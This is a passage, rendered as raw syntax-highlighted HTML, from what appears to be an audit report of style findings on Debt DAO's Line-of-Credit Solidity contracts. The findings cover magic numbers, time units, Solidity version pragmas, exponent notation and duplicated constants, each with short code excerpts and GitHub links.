class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">transferOwnerFunction</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">bytes4</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newOwner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newOperator</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">201</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newTreasury</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96</a></p>\n<h2 id=\"n06--constants-should-be-defined-rather-than-using-magic-numbers\" style=\"position:relative;\"><a href=\"#n06--constants-should-be-defined-rather-than-using-magic-numbers\" aria-label=\"n06  constants should be defined rather than using magic numbers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑06]  <code>constant</code>s should be defined rather than using magic numbers</h2>\n<p>Even <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39\">assembly</a> can benefit from using readable constants instead of hex/numeric literals.</p>\n<p><em>There are 7 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = !</span><span class=\"mtk12\">passed</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_numerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralValue</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// scale to 4 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 5</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">_numerator</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">debtValue</span><span class=\"mtk1\">) + </span><span class=\"mtk7\">5</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">assetDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:                      </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">assetDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 100</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">escrowedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">self</span><span class=\"mtk1\">.</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">[</span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">ownerSplit</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L90\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L90</a></p>\n<h2 id=\"n07--numeric-values-having-to-do-with-time-should-use-time-units-for-readability\" style=\"position:relative;\"><a href=\"#n07--numeric-values-having-to-do-with-time-should-use-time-units-for-readability\" aria-label=\"n07  numeric values having to do with time should use time units for readability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑07]  Numeric values having to do with time should use time units for readability</h2>\n<p>There are <a href=\"https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units\">units</a> for seconds, minutes, hours, days, and weeks, and since they’re defined, they should be used.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">factories</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 3000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">defaultMinCRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 30.00% minimum collateral ratio</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L14\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L14</a></p>\n<h2 id=\"n08--use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n08--use-a-more-recent-version-of-solidity\" aria-label=\"n08  use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑08]  Use a more recent version of Solidity</h2>\n<p>Use a Solidity version of at least 0.8.12 to get <code>string.concat()</code> to be used instead of <code>abi.encodePacked(&#x3C;str>,&#x3C;str>)</code>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MutualConsent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">3</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L3\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L3</a></p>\n<h2 id=\"n09--use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n09--use-a-more-recent-version-of-solidity\" aria-label=\"n09  use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑09]  Use a more recent version of Solidity</h2>\n<p>Use a Solidity version of at least 0.8.13 to get the ability to use <code>using for</code> with a list of free functions.</p>\n<p><em>There are 6 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L1</a></p>\n<h2 id=\"n10--use-scientific-notation-eg-1e18-rather-than-exponentiation-eg-1018\" style=\"position:relative;\"><a href=\"#n10--use-scientific-notation-eg-1e18-rather-than-exponentiation-eg-1018\" aria-label=\"n10  use scientific notation eg 1e18 rather than exponentiation eg 1018 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑10]  Use scientific notation (e.g. <code>1e18</code>) rather than exponentiation (e.g. <code>10**18</code>)</h2>\n<p>While the compiler knows to optimize away the exponentiation, it’s still better coding practice to use idioms that do not require compiler optimization, if they exist.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_numerator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralValue</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// scale to 4 decimals</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42</a></p>\n<h2 id=\"n11--constant-redefined-elsewhere\" style=\"position:relative;\"><a href=\"#n11--constant-redefined-elsewhere\" aria-label=\"n11  constant redefined elsewhere permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑11]  Constant redefined elsewhere</h2>\n<p>Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A <a href=\"https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678\">cheap way</a> to store constants in a single location is to create an <code>internal constant</code> in a <code>library</code>. If the variable is a local cache of another contract’s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don’t get out of sync.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit seen in contracts/modules/credit/LineOfCredit.sol </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span 